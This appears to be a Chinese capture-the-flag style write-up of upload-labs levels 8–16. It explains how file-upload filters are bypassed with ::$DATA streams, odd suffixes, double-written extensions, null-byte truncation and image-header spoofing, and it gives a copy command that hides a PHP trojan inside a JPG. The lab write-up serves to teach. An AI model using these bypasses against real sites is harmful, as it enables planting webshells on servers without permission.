&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;下一题&lt;/p&gt;
&lt;h1 id=&#34;pass-08&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-08&#34;&gt;#&lt;/a&gt; Pass-08&lt;/h1&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;上传 hqxx.php::DATA&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-08-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;利用 windows 特性：&lt;/p&gt;
&lt;p&gt;必须是 windows, 必须是 php, 必须是那个源文件&lt;br&gt;
 php 在 window 的时候如果文件名后加上 &amp;quot;::$DATA&amp;quot;&lt;/p&gt;
&lt;p&gt;会把 &amp;quot;::$DATA&amp;quot; 之后的数据当成文件流处理，不会检测后缀名&lt;/p&gt;
&lt;p&gt;且保持 &amp;quot;::$DATA&amp;quot; 之前的文件名&lt;/p&gt;
&lt;p&gt;他的目的就是不检查后缀名&lt;/p&gt;
&lt;p&gt;改源代码测试了一下，其实和。空格是一样的，就是利用 windows 特性绕过黑名单，上传到文件夹时，文件后面的 &amp;quot;::DATA…&amp;quot; 已经被去掉了&lt;/p&gt;
&lt;h1 id=&#34;pass-09&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-09&#34;&gt;#&lt;/a&gt; Pass-09&lt;/h1&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看提示：本 pass 只允许上传.jpg|.png|.gif 后缀的文件！&lt;/p&gt;
&lt;p&gt;看了源码发现，你这个骗子，明明还是黑名单，下次不看提示了&lt;/p&gt;
&lt;p&gt;看源码：先删除了末尾的点，然后去掉了::$DATA，后缀转成了小写，最后去除首尾空格&lt;/p&gt;
&lt;p&gt;那就 hqxx.php. .&lt;/p&gt;
&lt;p&gt;这样最后在末尾就留下了一个点，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-09-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;跟着代码逻辑走～，可是黑盒都看不到源代码唉&lt;/p&gt;
&lt;h1 id=&#34;pass-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-10&#34;&gt;#&lt;/a&gt; Pass-10&lt;/h1&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;哈哈哈，源代码注释没了&lt;/p&gt;
&lt;p&gt;先去除文件名中的所有空格，再把文件名中所有在黑名单中存在的字符置空&lt;/p&gt;
&lt;p&gt;那么就，双写，成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-10-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;下一题&lt;/p&gt;
&lt;h1 id=&#34;pass-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-11&#34;&gt;#&lt;/a&gt; Pass-11&lt;/h1&gt;
&lt;h2 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;观摩源代码，发现是白名单，允许的类型有’jpg’,‘png’,‘gif’，而且还给文件重命名了&lt;/p&gt;
&lt;p&gt;上传 php 抓包发现 save_path=…/upload&lt;/p&gt;
&lt;p&gt;源码中文件保存路径就是 $img_path = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;99&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;Y&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET[&amp;#x27;save_path&amp;#x27;].&amp;quot;/&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.038em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;file_ext;&lt;/p&gt;
&lt;p&gt;用 00 截断，在路径后面加上 hqxx.php%00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-11-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-11&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;通过字符拼接，连接路径文件名，后台处理后上传到 windows 时，os 看见 %00 自动截断&lt;/p&gt;
&lt;p&gt;00 截断的前提条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态&lt;/p&gt;
&lt;p&gt;move_uploaded_file 函数的底层实现类似于 C 语言，遇到 0x00 会截断&lt;/p&gt;
&lt;h1 id=&#34;pass-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-12&#34;&gt;#&lt;/a&gt; Pass-12&lt;/h1&gt;
&lt;h2 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;上传文件抓包，发现路径也在表单中了，在后面加上 /hqxx.php ，注意后面有一个空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为 post 请求没办法解析 %00，所以我们在 hex 中更改数据包&lt;/p&gt;
&lt;p&gt;找到对应行，代表空格的 20，改为 00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-12&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;为啥网上有人说这是二进制代码，可是这明明不是二进制啊&lt;/p&gt;
&lt;p&gt;通常 JPEG/JPG: FF D8 , PNG:89 50，GIF:47 49&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;JPEG;.JPE;.JPG，”JPGGraphic File”&lt;/li&gt;
&lt;li&gt;gif，”GIF 89A”&lt;/li&gt;
&lt;li&gt;zip，”Zip Compressed”&lt;/li&gt;
&lt;li&gt;doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;pass-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-13&#34;&gt;#&lt;/a&gt; Pass-13&lt;/h1&gt;
&lt;h2 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;源代码中读取文件前 2 字节，来判断文件类型是否属于 jpg、png 或者 gif 类型&lt;/p&gt;
&lt;p&gt;类型判断成功后，还更改了文件名&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里用文件包含来解析图片马&lt;/p&gt;
&lt;p&gt;手动在 upload 文件夹添加一个文件包含的 php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后浏览器解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-13&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;unpack () 函数从二进制字符串对数据进行解包。&lt;/p&gt;
&lt;p&gt;也就是说本身没有文件包含漏洞的话这个图片马是没有办法解析的，唉&lt;/p&gt;
&lt;h1 id=&#34;pass-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-14&#34;&gt;#&lt;/a&gt; Pass-14&lt;/h1&gt;
&lt;h2 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，换了一种方式验证类型&lt;/p&gt;
&lt;p&gt;getimagesize () 这个函数功能会对目标文件的 16 进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的&lt;/p&gt;
&lt;p&gt;所以还是伪造一个头部信息，上传图片马&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-14-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;图片马的利用可以结合文件包含，解析漏洞等… 反正就是要把他用 php 解析嘛&lt;/p&gt;
&lt;p&gt;比如，&lt;a href=&#34;https://www.cnblogs.com/renhaoblog/p/12874603.html&#34;&gt;nginx 解析漏洞&lt;/a&gt;，和版本无关，属于用户配置不当产生的&lt;/p&gt;
&lt;h2 id=&#34;总结-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-14&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-getimagesize.html&#34;&gt;菜鸟教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;getimagesize () 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。&lt;/p&gt;
&lt;p&gt;实例 1：本地图片文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list($width, $height, $type, $attr) = getimagesize(&amp;quot;runoob-logo.png&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;宽度为：&amp;quot; . $width;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;高度为：&amp;quot; . $height;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;类型为：&amp;quot; . $attr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上实例输出结果为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;宽度为：290高度为：69类型为：3属性：width=&amp;quot;290&amp;quot; height=&amp;quot;69&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例 2：远程图片文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php$remote_png_url = &amp;#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&amp;#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上实例输出结果为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Array(    [0] =&amp;gt; 290    [1] =&amp;gt; 69    [2] =&amp;gt; 3    [3] =&amp;gt; width=&amp;quot;290&amp;quot; height=&amp;quot;69&amp;quot;    [bits] =&amp;gt; 8    [mime] =&amp;gt; image/png)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;返回结果说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;索引 0 给出的是图像宽度的像素值&lt;/li&gt;
&lt;li&gt;索引 1 给出的是图像高度的像素值&lt;/li&gt;
&lt;li&gt;索引 2 给出的是图像的类型，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM&lt;/li&gt;
&lt;li&gt;索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签&lt;/li&gt;
&lt;li&gt;索引 bits 给出的是图像的每种颜色的位数，二进制格式&lt;/li&gt;
&lt;li&gt;索引 channels 给出的是图像的通道值，RGB 图像默认是 3&lt;/li&gt;
&lt;li&gt;索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;pass-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-15&#34;&gt;#&lt;/a&gt; Pass-15&lt;/h1&gt;
&lt;h2 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;使用 exif_imagetype () 检查是否为图片文件&lt;/p&gt;
&lt;p&gt;用图片马进行绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是还得帮 php 安装 exif.so 扩展库&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-15&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;exif_imagetype ( string $filename ) : int &lt;em&gt;exif_imagetype()&lt;/em&gt; 读取一个图像的第一个字节并检查其签名。&lt;/p&gt;
&lt;h1 id=&#34;pass-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-16&#34;&gt;#&lt;/a&gt; Pass-16&lt;/h1&gt;
&lt;h2 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，判断了后缀，然后利用 imagecreatefrompng () 等函数创建图片，同时也利用这个函数判断图片类型是否一致了，然后再重命名文件&lt;/p&gt;
&lt;p&gt;依然用图片马绕过，但是简单的在文件前加入 GIF89a 已经不可&lt;/p&gt;
&lt;p&gt;那就把图片和木马合在一起叭，cmd 执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy pig.jpg/b +  a.php/a haha.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再上传 haha.jpg&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-16-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;往下翻可以看到木马被插在了图片的中间&lt;/p&gt;
